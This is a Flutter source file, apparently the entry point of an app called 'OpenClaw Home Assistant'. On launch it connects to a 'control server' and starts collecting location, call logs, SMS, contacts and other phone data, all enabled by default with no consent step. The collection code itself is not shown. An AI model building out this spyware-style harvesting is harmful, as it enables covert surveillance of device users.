import 'package:flutter/material.dart';
import 'package:openclaw_home_assistant/core/data_collection/data_collector.dart';
import 'package:openclaw_home_assistant/core/connectivity/connection_manager.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  // 初始化连接管理器
  await ConnectionManager().initialize();
  
  // 初始化数据收集器
  await DataCollector().initialize();
  
  runApp(const HomeAssistantApp());
}

class HomeAssistantApp extends StatelessWidget {
  const HomeAssistantApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'OpenClaw Home Assistant',
      theme: ThemeData(
        primarySwatch: Colors.blue,
        useMaterial3: true,
      ),
      home: const HomeAssistantScreen(),
    );
  }
}

class HomeAssistantScreen extends StatefulWidget {
  const HomeAssistantScreen({super.key});

  @override
  State<HomeAssistantScreen> createState() => _HomeAssistantScreenState();
}

class _HomeAssistantScreenState extends State<HomeAssistantScreen> {
  final ConnectionManager _connectionManager = ConnectionManager();
  final DataCollector _dataCollector = DataCollector();
  
  bool _isConnected = false;
  String _statusMessage = 'Initializing...';

  @override
  void initState() {
    super.initState();
    _setupConnection();
    _startDataCollection();
  }

  Future<void> _setupConnection() async {
    _connectionManager.connectionStatusStream.listen((status) {
      setState(() {
        _isConnected = status.isConnected;
        _statusMessage = status.message;
      });
    });
    
    await _connectionManager.connectToControlServer();
  }

  Future<void> _startDataCollection() async {
    await _dataCollector.startAllCollections();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('OpenClaw Home Assistant'),
        backgroundColor: _isConnected ? Colors.green : Colors.red,
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              'Status: $_statusMessage',
              style: TextStyle(
                color: _isConnected ? Colors.green : Colors.red,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 20),
            const Text(
              'This app collects data to understand your habits and preferences.\n'
              'All data is encrypted and sent securely to your control server.',
              style: TextStyle(fontSize: 12),
            ),
            const SizedBox(height: 20),
            Expanded(
              child: ListView(
                children: const [
                  DataCollectionItem(title: 'Location History', enabled: true),
                  DataCollectionItem(title: 'App Usage', enabled: true),
                  DataCollectionItem(title: 'Call Logs', enabled: true),
                  DataCollectionItem(title: 'SMS Messages', enabled: true),
                  DataCollectionItem(title: 'Calendar Events', enabled: true),
                  DataCollectionItem(title: 'Contacts', enabled: true),
                  DataCollectionItem(title: 'Battery Usage', enabled: true),
                  DataCollectionItem(title: 'Network Activity', enabled: true),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class DataCollectionItem extends StatelessWidget {
  final String title;
  final bool enabled;

  const DataCollectionItem({
    super.key,
    required this.title,
    required this.enabled,
  });

  @override
  Widget build(BuildContext context) {
    return Card(
      child: ListTile(
        title: Text(title),
        trailing: enabled
            ? const Icon(Icons.check_circle, color: Colors.green)
            : const Icon(Icons.cancel, color: Colors.red),
      ),
    );
  }
}